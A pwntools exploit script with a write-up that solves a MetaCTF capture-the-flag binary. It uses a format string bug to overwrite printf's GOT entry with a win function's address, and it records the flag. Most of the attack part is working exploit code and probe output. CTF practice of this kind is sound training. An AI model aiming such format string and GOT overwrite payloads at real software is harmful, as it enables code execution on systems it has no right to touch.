#!/usr/bin/env python3

from pwn import *
from pwnlib.fmtstr import FmtStr, fmtstr_payload, fmtstr_split

exe = "./leet"

elf = context.binary = ELF(exe, checksec=False)

win_addr = p32(0x80491F6)  # address of win function

# p = process(exe)
p = remote("host5.metaproblems.com", 5040)


payload = fmtstr_payload(
    7,
    {elf.symbols["got.printf"]: win_addr},
    # 7th offset of format string vulnerability
)
print(p.recvline())
p.sendline(payload)
print(p.recvall())

# flag : MetaCTF{1337_h@kkaR}
"""
Analyzing the binary, we see a win function at address 0x80491f6 that prints the
flag. We need to call this function, but it is not called anywhere in the program.
When looking at function at address 0x8049372 which happens to be main() there are
two instances of printf() being called insecurely. The format string specifier (first
argument) can be directly manipulated by user input. Both are possible viable targets,
but the first one will be easier to write an exploit for 
In order to exploit this vulnerability, first we need to know the offset on the stack
at which the format string appears again. To do this, we input several %x. can count
how many %x. it takes for us to see 252e7825 get printed out (which is just little
endian hex digits for %x. ). the period characters is there help delimit the hex
strings so we can visually see each 32bit word

```
./leet
Enter a string to leet speakify:
%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.
Original Input:
37.20.5f.ff943ec4.f7f2d780.37.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e
Leet Speak:
37.20.5f.ff943ec4.f7f2d780.37.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.37.252
```
In this case the offset is 7 
GOT Overwrite
We have the perfect conditions for a GOT overwrite to the win function
Relro is Off
Format String Vulnerability
A dynamically linked function whose
Address is already resolved
called after the vulnerable printf
Using pwntools we can craft a payload to overwrite the GOT entry of printf() to win()
using the string format vulnerablilty in the first printf called

"""
